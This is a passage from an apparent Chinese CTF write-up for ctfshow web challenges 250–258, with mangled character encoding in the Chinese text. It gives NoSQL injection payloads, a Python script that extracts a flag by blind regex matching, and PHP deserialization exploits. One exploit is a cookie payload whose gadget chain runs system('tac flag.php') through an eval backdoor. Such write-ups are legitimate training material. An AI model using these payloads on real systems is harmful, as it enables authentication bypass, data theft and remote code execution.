class="line">username[$regex]=.*&amp;password[$regex]=.*</span><br><span class="line">username[$regex]=.&amp;password[$regex]=.</span><br><span class="line">username[$ne]=1&amp;password[$regex]=ct</span><br></pre></td></tr></table></figure><h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>æŸ¥ä¸‹ç”¨æˆ·åä¸ç­‰äºadminçš„å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=admin&amp;password[$ne]=1</span><br></pre></td></tr></table></figure><h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><p>ä½¿ç”¨æ­£åˆ™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[$ne]=1&amp;password[$regex]=^ctfshow&#123;</span><br></pre></td></tr></table></figure><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>åˆ©ç”¨æ­£åˆ™è¿›è¡Œç›²æ³¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># letters = string.ascii_letters + string.digits + &#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line">letters = <span class="string">&#x27;0123456789abcdef-&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://588fe024-d17c-4139-8dde-0b912e3070fe.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username[$ne]&quot;</span>: <span class="string">f&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">f&quot;^<span class="subst">&#123;flag+j&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&#x27;\u767b\u9646\u6210\u529f&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># ctfshow&#123;1839bec9-f8ee-49d4-af37-0a660031bd18&#125;</span></span><br></pre></td></tr></table></figure><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ <code>exp</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?username=a&amp;password=a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>9ade9863-8899-4452-958a-4cc9e26290ee.challenge.ctf.show</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22a%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€ exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=a&amp;password=b</span><br><span class="line"></span><br><span class="line">Cookieï¼š</span><br><span class="line">user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ææ„æ—¶è°ƒç”¨åé—¨å‡½æ•°æ‰§è¡Œå‘½ä»¤å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=a&amp;password=a</span><br><span class="line">Cookieï¼š</span><br><span class="line">user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 